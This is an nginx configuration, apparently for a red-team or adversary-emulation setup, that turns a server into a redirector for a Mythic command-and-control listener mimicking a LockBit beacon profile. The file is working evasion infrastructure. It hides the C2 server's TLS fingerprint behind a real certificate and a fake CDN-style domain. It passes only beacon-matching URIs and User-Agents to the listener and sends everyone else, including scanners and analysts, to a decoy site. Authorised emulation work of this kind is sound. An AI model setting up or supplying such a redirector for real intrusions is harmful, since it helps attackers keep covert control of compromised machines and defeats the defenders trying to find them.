# nginx redirector for the LockBit httpx profile.
#
# Purpose: terminate TLS with a real Let's Encrypt cert (so the internet-facing JA3S/JARM is a
# mainstream nginx/OpenSSL stack, not the Mythic listener's self-signed Go/Python fingerprint),
# and only forward traffic that matches the profile (Host + URI + User-Agent). Everything else
# gets a 302 to a decoy site.
#
# Keep this file and the profile generated from the SAME source (Tyche can emit both) so the
# match conditions never drift from the beacon.
#
# Replace:
#   REDIR_DOMAIN            -> the FQDN this VPS answers on (must resolve to this box)
#   MYTHIC_HTTPX_UPSTREAM   -> http://<mythic-ip>:<httpx-listener-port>  (cleartext behind TLS)
#   DECOY_URL               -> a benign site to bounce non-matching requests to

map $http_user_agent $is_beacon_ua {
    default 0;
    "~*Chrome/120\.0\.0\.0 Safari/537\.36" 1;   # matches the profile User-Agent
}

server {
    listen 443 ssl http2;
    server_name REDIR_DOMAIN assets-portal.io;  # fake SaaS/CDN name for threat realism

    ssl_certificate     /etc/letsencrypt/live/REDIR_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/REDIR_DOMAIN/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;

    # Only the profile's two URIs, and only with the right UA, reach Mythic.
    location = /_next.css { if ($is_beacon_ua = 0) { return 302 DECOY_URL; } proxy_pass MYTHIC_HTTPX_UPSTREAM; include /etc/nginx/proxy_params; }
    location = /boards    { if ($is_beacon_ua = 0) { return 302 DECOY_URL; } proxy_pass MYTHIC_HTTPX_UPSTREAM; include /etc/nginx/proxy_params; }

    # Everything else looks like a normal (empty) web app.
    location / { return 302 DECOY_URL; }
}

# /etc/nginx/proxy_params should preserve the beacon's headers to Mythic:
#   proxy_set_header Host $host;
#   proxy_set_header X-Forwarded-For $remote_addr;
#   proxy_ssl_verify off;
